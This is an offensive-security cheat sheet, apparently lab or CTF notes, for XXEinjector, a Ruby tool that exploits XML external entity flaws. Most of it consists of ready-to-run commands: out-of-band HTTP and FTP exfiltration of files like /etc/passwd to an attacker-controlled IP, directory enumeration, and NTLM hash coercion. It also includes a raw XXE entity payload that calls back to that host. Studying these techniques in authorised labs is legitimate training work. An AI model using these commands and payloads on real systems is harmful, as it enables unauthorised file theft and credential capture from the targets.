# XXEinjector

**Tags:** `#xxeinjector` `#xxe` `#xml` `#automation` `#oob`

Ruby tool for automated XXE exploitation using direct and out-of-band methods. Handles OOB HTTP/FTP data exfiltration, PHP filter base64 encoding, Gopher protocol, and NTLM hash coercion. Automates file enumeration once a XXE injection point is confirmed.

**Source:** https://github.com/enjoiz/XXEinjector
**Install:** `git clone https://github.com/enjoiz/XXEinjector.git && cd XXEinjector && gem install httpclient`

```bash
ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

> [!note]
> Confirm the XXE injection point manually first (Burp). XXEinjector automates enumeration once you know the vulnerable parameter. The request file must contain `XXEINJECT` where the payload goes.

---

## Setup

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
gem install httpclient
```

---

## Request File Format

Save the raw HTTP request with `XXEINJECT` as the placeholder:

```
POST /xml-endpoint HTTP/1.1
Host: target.htb
Content-Type: application/xml
Content-Length: 100

<?xml version="1.0"?>
XXEINJECT
```

Save as `/tmp/xxe.req`

---

## Usage

```bash
# OOB HTTP exfil with PHP filter (base64 encoded file read)
ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# OOB FTP exfil (works when HTTP is filtered)
ruby XXEinjector.rb --host=10.10.14.5 --ftpport=2121 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=ftp

# Direct read (no OOB — response reflected in HTTP reply)
ruby XXEinjector.rb --file=/tmp/xxe.req --path=/etc/passwd --direct

# Enumerate directory
ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/ --oob=http --phpfilter

# NTLM hash coercion (Windows targets)
ruby XXEinjector.rb --host=10.10.14.5 --file=/tmp/xxe.req --ntlm

# Custom HTTP port on target side
ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter --rport=80
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `--host` | Your IP (tun0) for OOB callbacks |
| `--httpport` | HTTP listener port for OOB |
| `--ftpport` | FTP listener port for OOB |
| `--file` | Request file with `XXEINJECT` placeholder |
| `--path` | File path to read on target |
| `--oob=http` | Use OOB HTTP exfiltration |
| `--oob=ftp` | Use OOB FTP exfiltration |
| `--phpfilter` | Wrap in PHP filter (base64) for binary-safe read |
| `--direct` | Direct read (reflected in response) |
| `--ntlm` | Coerce NTLM auth to your host |
| `--enum` | Enumerate instead of reading |
| `--rport` | Target HTTP port (default 80) |
| `--ssl` | Use HTTPS |

---

## Retrieve Results

```bash
# Results saved under Logs/
cat Logs/10.129.201.94/etc/passwd.log

# List all captured files
ls Logs/10.129.201.94/
```

---

## Manual Verification First (Burp)

Before running XXEinjector, confirm the injection point manually:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://10.10.14.5:8000/test">]>
<root><data>&xxe;</data></root>
```

Check Kali HTTP server for a callback. If it hits, the endpoint is vulnerable and XXEinjector will work.

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
